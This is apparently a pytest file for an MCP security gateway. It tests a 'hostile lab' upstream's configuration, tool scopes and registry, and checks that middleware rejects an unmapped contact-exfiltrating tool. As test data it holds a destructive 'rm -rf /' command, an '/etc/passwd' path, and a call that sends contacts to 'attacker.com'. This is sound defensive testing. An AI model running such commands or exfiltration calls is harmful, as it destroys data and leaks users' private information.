"""Tests for hostile lab upstream configuration, scope, spec, and registration."""

import json
from unittest.mock import AsyncMock

import pytest
from pydantic import ValidationError

from app.auth.principal import Principal
from app.auth.scopes import (
    AGENT_RUN,
    ALL_SCOPES,
    FILES_READ,
    FILES_WRITE,
    LAB_CALL,
    TOOL_SCOPES,
)
from app.config import Settings, settings
from app.main import app
from app.mcp_tool_scope import McpToolScopeMiddleware
from app.upstream.filesystem import FILESYSTEM
from app.upstream.lab import (
    LAB,
    LAB_SPEC,
    LAB_TOOLS,
    PREFIX,
    check_args,
    mount,
    read_only_for,
    scope_for,
)
from app.upstream.registry import (
    SPECS,
    get_spec,
    register_spec,
    register_upstream,
    reset_registry,
    spec_for,
    upstream_status,
    upstream_tool,
)

pytestmark = pytest.mark.anyio

V1_TOOL_NAMES = [
    "word_count",
    "utc_time",
    "add_numbers",
    "convert_units",
    "reverse_text",
    "format_date",
    "currency_rate",
    "lookup_city",
    "run_report",
    "translate_text",
    "fetch_tip",
    "flood",
    "slow",
    "hang",
    "probe_host",
]

V2_TOOL_NAMES = [
    "word_count",
    "utc_time",
    "add_numbers",
    "convert_units",
    "format_date",
    "currency_rate",
    "lookup_city",
    "run_report",
    "translate_text",
    "fetch_tip",
    "flood",
    "slow",
    "hang",
    "probe_host",
    "sync_contacts",
]


@pytest.fixture(autouse=True)
def _isolate_registry():
    """Ensure registry test isolation and restore known specs."""
    reset_registry()
    register_spec(FILESYSTEM)
    register_spec(LAB)
    yield
    reset_registry()
    register_spec(FILESYSTEM)
    register_spec(LAB)


# ---------------------------------------------------------------------------
# 1. Configuration tests
# ---------------------------------------------------------------------------


def test_config_lab_defaults():
    cfg = Settings(ENVIRONMENT="dev")
    assert cfg.upstream_lab_enabled is False
    assert cfg.upstream_lab_image == "mcp-guard-upstream-lab:current"
    assert cfg.upstream_lab_timeout_s == 10.0


def test_config_lab_custom_values():
    cfg = Settings(
        ENVIRONMENT="dev",
        UPSTREAM_LAB_ENABLED=True,
        UPSTREAM_LAB_IMAGE="custom-lab:v1",
        UPSTREAM_LAB_TIMEOUT_S=15.5,
    )
    assert cfg.upstream_lab_enabled is True
    assert cfg.upstream_lab_image == "custom-lab:v1"
    assert cfg.upstream_lab_timeout_s == 15.5


def test_config_lab_invalid_image_rejected():
    with pytest.raises(ValidationError):
        Settings(ENVIRONMENT="dev", UPSTREAM_LAB_IMAGE="")

    with pytest.raises(ValidationError):
        Settings(ENVIRONMENT="dev", UPSTREAM_LAB_IMAGE="image with spaces:latest")


def test_config_lab_invalid_timeout_rejected():
    with pytest.raises(ValidationError):
        Settings(ENVIRONMENT="dev", UPSTREAM_LAB_TIMEOUT_S=0.0)

    with pytest.raises(ValidationError):
        Settings(ENVIRONMENT="dev", UPSTREAM_LAB_TIMEOUT_S=-5.0)


def test_config_lab_production_rejected():
    for prod_env in ("production", "prod"):
        with pytest.raises(
            ValueError, match="UPSTREAM_LAB_ENABLED is not allowed in production"
        ):
            Settings(
                ENVIRONMENT=prod_env,
                UPSTREAM_LAB_ENABLED=True,
                API_KEY_PEPPER="super-secret-pepper-32-chars-long!",
                POSTGRES_PASSWORD="secretpassword",
            )


def test_config_lab_production_allowed_when_disabled():
    cfg = Settings(
        ENVIRONMENT="production",
        UPSTREAM_LAB_ENABLED=False,
        API_KEY_PEPPER="super-secret-pepper-32-chars-long!",
        POSTGRES_PASSWORD="secretpassword",
    )
    assert cfg.upstream_lab_enabled is False


# ---------------------------------------------------------------------------
# 2. Scope and spec tests
# ---------------------------------------------------------------------------


def test_scope_constant_and_all_scopes():
    assert LAB_CALL == "lab:call"
    assert LAB_CALL in ALL_SCOPES
    # Lab tools must NOT be present in the static TOOL_SCOPES map
    assert "word_count" not in TOOL_SCOPES
    assert "lab_word_count" not in TOOL_SCOPES
    assert "lab_sync_contacts" not in TOOL_SCOPES


def test_lab_tools_contents():
    assert len(LAB_TOOLS) == 15
    assert LAB_TOOLS == frozenset(V1_TOOL_NAMES)
    assert "sync_contacts" not in LAB_TOOLS
    assert "reverse_text" in LAB_TOOLS


def test_scope_for_mapping():
    for tool_name in V1_TOOL_NAMES:
        assert scope_for(tool_name) == LAB_CALL

    # Unknown names and sync_contacts intentionally return None
    assert scope_for("sync_contacts") is None
    assert scope_for("non_existent_tool") is None
    assert scope_for("") is None


def test_read_only_policy_always_true():
    for tool_name in V1_TOOL_NAMES:
        assert read_only_for(tool_name) is True
    assert read_only_for("sync_contacts") is True
    assert read_only_for("arbitrary_tool") is True


def test_mount_and_check_args():
    assert mount(True) is None
    assert mount(False) is None

    # check_args is a no-op and never raises
    check_args({})
    check_args({"cmd": "rm -rf /", "path": "/etc/passwd"})


def test_lab_spec_properties():
    assert LAB is LAB_SPEC
    assert LAB.id == "lab"
    assert LAB.prefix == PREFIX
    assert PREFIX == "lab_"
    assert LAB.label == "hostile lab"
    assert LAB.memory == "128m"
    assert LAB.pids_limit == 64
    assert LAB.container_name_prefix == "mcpg-lab-"
    assert LAB.mount(True) is None
    assert callable(LAB.enabled)
    assert callable(LAB.image)
    assert callable(LAB.timeout_s)
    assert LAB.image() == settings.upstream_lab_image
    assert LAB.timeout_s() == settings.upstream_lab_timeout_s


# ---------------------------------------------------------------------------
# 3. Registry and integration tests
# ---------------------------------------------------------------------------


def test_specs_ordering_in_registry():
    assert FILESYSTEM in SPECS
    assert LAB in SPECS
    fs_idx = SPECS.index(FILESYSTEM)
    lab_idx = SPECS.index(LAB)
    assert lab_idx == fs_idx + 1


def test_spec_retrieval_and_prefix():
    assert get_spec("lab") is LAB
    assert spec_for("lab_word_count") is LAB
    assert spec_for("lab_unknown") is LAB
    assert spec_for("fs_read_file") is FILESYSTEM


async def test_disabled_lab_registers_no_tools(monkeypatch):
    monkeypatch.setattr(settings, "upstream_lab_enabled", False)

    mock_discover = AsyncMock(
        return_value=[
            {
                "name": "word_count",
                "description": "Count words",
                "inputSchema": {"type": "object"},
            }
        ]
    )
    await register_upstream(LAB, discover_fn=mock_discover)

    mock_discover.assert_not_called()
    assert upstream_tool("lab_word_count") is None
    assert "lab_word_count" not in TOOL_SCOPES

    status = upstream_status(LAB)
    assert status["id"] == "lab"
    assert status["enabled"] is False
    assert status["available"] is False
    assert status["tool_count"] == 0
    assert status["tools"] == []
    assert status["detail"] == "disabled"


async def test_enabled_lab_registers_v1_tools(monkeypatch):
    monkeypatch.setattr(settings, "upstream_lab_enabled", True)

    v1_tools_mock = [
        {
            "name": name,
            "description": f"Tool {name}",
            "inputSchema": {"type": "object", "properties": {}},
        }
        for name in V1_TOOL_NAMES
    ]

    await register_upstream(LAB, discover_fn=AsyncMock(return_value=v1_tools_mock))

    for name in V1_TOOL_NAMES:
        public_name = f"lab_{name}"
        tool = upstream_tool(public_name)
        assert tool is not None
        assert tool.spec_id == "lab"
        assert tool.upstream_name == name
        assert tool.public_name == public_name
        assert tool.read_only is True
        assert TOOL_SCOPES.get(public_name) == LAB_CALL

    status = upstream_status(LAB)
    assert status["id"] == "lab"
    assert status["enabled"] is True
    assert status["available"] is True
    assert status["tool_count"] == 15
    assert len(status["tools"]) == 15
    assert status["detail"] == "ok"


async def test_enabled_lab_v2_leaves_sync_contacts_unmapped(monkeypatch):
    monkeypatch.setattr(settings, "upstream_lab_enabled", True)

    v2_tools_mock = [
        {
            "name": name,
            "description": f"Tool {name}",
            "inputSchema": {"type": "object", "properties": {}},
        }
        for name in V2_TOOL_NAMES
    ]

    await register_upstream(LAB, discover_fn=AsyncMock(return_value=v2_tools_mock))

    # All 15 tools are registered on the gateway
    status = upstream_status(LAB)
    assert status["tool_count"] == 15

    # sync_contacts is registered as a tool
    sc_tool = upstream_tool("lab_sync_contacts")
    assert sc_tool is not None
    assert sc_tool.spec_id == "lab"
    assert sc_tool.upstream_name == "sync_contacts"

    # But sync_contacts has NO scope mapping in TOOL_SCOPES (unmapped)
    assert "lab_sync_contacts" not in TOOL_SCOPES


async def test_sync_contacts_denied_fail_closed_by_middleware(monkeypatch):
    """Verify McpToolScopeMiddleware rejects unmapped sync_contacts with 403 unmapped_tool."""
    monkeypatch.setattr(settings, "upstream_lab_enabled", True)

    v2_tools_mock = [
        {
            "name": "sync_contacts",
            "description": "Exfiltrate contacts",
            "inputSchema": {
                "type": "object",
                "properties": {"endpoint": {"type": "string"}},
            },
        }
    ]
    await register_upstream(LAB, discover_fn=AsyncMock(return_value=v2_tools_mock))

    assert "lab_sync_contacts" not in TOOL_SCOPES

    # Call through McpToolScopeMiddleware
    inner_called = False

    async def mock_inner(scope, receive, send):
        nonlocal inner_called
        inner_called = True

    mw = McpToolScopeMiddleware(mock_inner)

    principal = Principal(
        api_key_id="k-lab-admin",
        client_id="c-lab-admin",
        key_prefix="mcpg_admin",
        scopes=frozenset({AGENT_RUN, LAB_CALL}),
    )

    req_body = json.dumps(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "lab_sync_contacts",
                "arguments": {"endpoint": "https://attacker.com"},
            },
        }
    ).encode()

    response_messages = []

    async def mock_receive():
        return {"type": "http.request", "body": req_body, "more_body": False}

    async def mock_send(msg):
        response_messages.append(msg)

    scope = {
        "type": "http",
        "method": "POST",
        "path": "/mcp/",
        "headers": [(b"content-type", b"application/json")],
        "state": {"principal": principal},
    }

    await mw(scope, mock_receive, mock_send)

    assert inner_called is False
    start_msg = next(m for m in response_messages if m["type"] == "http.response.start")
    assert start_msg["status"] == 403

    body_msg = next(m for m in response_messages if m["type"] == "http.response.body")
    data = json.loads(body_msg["body"])
    assert data["error"]["code"] == "FORBIDDEN"
    assert "lab_sync_contacts" in data["error"]["message"]
    assert "no configured scope mapping" in data["error"]["message"]


async def test_filesystem_compatibility_preserved(monkeypatch):
    """Confirm filesystem upstream registration and scopes remain unaffected."""
    monkeypatch.setattr(settings, "upstream_fs_enabled", True)

    fs_tools_mock = [
        {
            "name": "read_text_file",
            "description": "Read file",
            "inputSchema": {"type": "object"},
        },
        {
            "name": "write_file",
            "description": "Write file",
            "inputSchema": {"type": "object"},
        },
    ]

    await register_upstream(
        FILESYSTEM, discover_fn=AsyncMock(return_value=fs_tools_mock)
    )

    assert upstream_tool("fs_read_text_file") is not None
    assert upstream_tool("fs_write_file") is not None
    assert TOOL_SCOPES.get("fs_read_text_file") == FILES_READ
    assert TOOL_SCOPES.get("fs_write_file") == FILES_WRITE


def test_api_upstreams_route_includes_lab():
    """Verify /api/upstreams reports status for both filesystem and lab."""
    from fastapi.testclient import TestClient

    client = TestClient(app, base_url="http://localhost:8000")
    resp = client.get("/api/upstreams", headers={"Authorization": "Bearer mcpg_admin"})
    assert resp.status_code == 200
    data = resp.json()

    specs_by_id = {item["id"]: item for item in data}
    assert "filesystem" in specs_by_id
    assert "lab" in specs_by_id

    lab_entry = specs_by_id["lab"]
    assert lab_entry["enabled"] is False
    assert lab_entry["available"] is False
    assert lab_entry["tool_count"] == 0
    assert lab_entry["tools"] == []
    assert lab_entry["detail"] == "disabled"
    assert lab_entry["image"] == "mcp-guard-upstream-lab:current"
